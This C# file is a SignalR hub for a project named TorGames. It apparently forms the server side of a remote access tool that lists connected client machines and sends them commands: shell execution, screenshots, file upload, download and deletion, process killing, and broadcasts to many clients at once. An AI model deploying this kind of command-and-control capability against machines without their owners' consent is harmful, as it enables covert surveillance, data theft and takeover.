using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.SignalR;
using TorGames.Common.Protos;
using TorGames.Database;
using TorGames.Database.Entities;
using TorGames.Server.Models;
using TorGames.Server.Services;
using Microsoft.EntityFrameworkCore;

namespace TorGames.Server.Hubs;

/// <summary>
/// SignalR hub for web app communication.
/// Handles real-time updates about client connections and command execution.
/// </summary>
[Authorize]
public class ClientHub : Hub
{
    private readonly ClientManager _clientManager;
    private readonly IServiceProvider _serviceProvider;
    private readonly ILogger<ClientHub> _logger;
    private readonly TcpInstallerService? _tcpService;

    public ClientHub(ClientManager clientManager, IServiceProvider serviceProvider, ILogger<ClientHub> logger, TcpInstallerService? tcpService = null)
    {
        _clientManager = clientManager;
        _serviceProvider = serviceProvider;
        _logger = logger;
        _tcpService = tcpService;
    }

    public override async Task OnConnectedAsync()
    {
        _logger.LogInformation("Web app connected: {ConnectionId}", Context.ConnectionId);
        await base.OnConnectedAsync();
    }

    public override async Task OnDisconnectedAsync(Exception? exception)
    {
        _logger.LogInformation("Web app disconnected: {ConnectionId}", Context.ConnectionId);
        await base.OnDisconnectedAsync(exception);
    }

    /// <summary>
    /// Gets all clients from the database with live online status.
    /// </summary>
    public async Task<IEnumerable<ClientDto>> GetAllClients()
    {
        _logger.LogDebug("GetAllClients requested by {ConnectionId}", Context.ConnectionId);

        using var scope = _serviceProvider.CreateScope();
        var dbContext = scope.ServiceProvider.GetRequiredService<TorGamesDbContext>();

        // Get all clients from database
        var dbClients = await dbContext.Clients
            .AsNoTracking()
            .OrderByDescending(c => c.LastSeenAt)
            .ToListAsync();

        // Get currently connected clients for live status
        var liveClients = _clientManager.GetAllClients().ToDictionary(c => c.ClientId, c => c);

        // Merge database clients with live status
        var result = dbClients.Select(dbClient =>
        {
            liveClients.TryGetValue(dbClient.ClientId, out var liveClient);
            return ClientDto.FromDatabaseClient(dbClient, liveClient);
        }).ToList();

        return result;
    }

    /// <summary>
    /// Gets a specific client by connection key.
    /// </summary>
    public ClientDto? GetClient(string connectionKey)
    {
        var client = _clientManager.GetClient(connectionKey);
        return client != null ? ClientDto.FromConnectedClient(client) : null;
    }

    /// <summary>
    /// Gets all online clients.
    /// </summary>
    public IEnumerable<ClientDto> GetOnlineClients()
    {
        return _clientManager.GetOnlineClients().Select(ClientDto.FromConnectedClient);
    }

    /// <summary>
    /// Executes a command on a specific client.
    /// Routes to TCP service if client is connected via TCP.
    /// </summary>
    public async Task<bool> ExecuteCommand(ExecuteCommandRequest request)
    {
        _logger.LogInformation(
            "Command requested by {ConnectionId}: {CommandType} on {ConnectionKey}",
            Context.ConnectionId,
            request.CommandType,
            request.ConnectionKey);

        var command = new Command
        {
            CommandId = Guid.NewGuid().ToString(),
            CommandType = request.CommandType,
            CommandText = request.CommandText,
            TimeoutSeconds = request.TimeoutSeconds
        };

        // Update activity status based on command type
        var client = _clientManager.GetClient(request.ConnectionKey);
        if (client != null)
        {
            var activityStatus = GetActivityStatusForCommand(request.CommandType);
            client.SetActivityStatus(activityStatus);
        }

        // Check if this is a TCP client
        if (_tcpService != null && _tcpService.IsTcpClient(request.ConnectionKey))
        {
            _logger.LogDebug("Routing command to TCP client: {ConnectionKey}", request.ConnectionKey);
            return await _tcpService.SendCommandAsync(request.ConnectionKey, command);
        }

        // Fall back to gRPC client
        return await _clientManager.SendCommandAsync(request.ConnectionKey, command);
    }

    /// <summary>
    /// Gets a human-readable activity status for a command type.
    /// </summary>
    private static string GetActivityStatusForCommand(string commandType)
    {
        return commandType.ToLowerInvariant() switch
        {
            "shutdown" => "Shutting Down...",
            "restart" => "Restarting...",
            "uninstall" => "Uninstalling...",
            "update" => "Updating...",
            "download" => "Downloading...",
            "upload" => "Uploading...",
            "shell" or "cmd" => "Executing Command...",
            "screenshot" => "Taking Screenshot...",
            "processlist" => "Fetching Processes...",
            "systeminfo" => "Fetching System Info...",
            "listdir" => "Browsing Files...",
            "deletefile" => "Deleting File...",
            "killprocess" => "Killing Process...",
            "messagebox" => "Showing Message...",
            "ping" => "Pinging...",
            _ => "Executing..."
        };
    }

    /// <summary>
    /// Broadcasts a command to all clients of a specific type.
    /// </summary>
    public async Task<int> BroadcastCommand(string clientType, ExecuteCommandRequest request)
    {
        _logger.LogInformation(
            "Broadcast command requested by {ConnectionId}: {CommandType} to {ClientType}",
            Context.ConnectionId,
            request.CommandType,
            clientType);

        var command = new Command
        {
            CommandId = Guid.NewGuid().ToString(),
            CommandType = request.CommandType,
            CommandText = request.CommandText,
            TimeoutSeconds = request.TimeoutSeconds
        };

        return await _clientManager.BroadcastCommandAsync(clientType, command);
    }

    /// <summary>
    /// Gets connection statistics.
    /// </summary>
    public object GetStats()
    {
        return new
        {
            TotalConnected = _clientManager.ConnectedCount,
            OnlineCount = _clientManager.OnlineCount
        };
    }

    /// <summary>
    /// Requests detailed system information from a client.
    /// </summary>
    public async Task<DetailedSystemInfoDto?> RequestSystemInfo(string connectionKey)
    {
        _logger.LogInformation(
            "System info requested by {ConnectionId} for {ConnectionKey}",
            Context.ConnectionId,
            connectionKey);

        var info = await _clientManager.RequestDetailedSystemInfoAsync(connectionKey, TimeSpan.FromSeconds(30));

        if (info == null)
        {
            _logger.LogWarning("Failed to get system info for {ConnectionKey}", connectionKey);
            return null;
        }

        return DetailedSystemInfoDto.FromProto(info);
    }
}
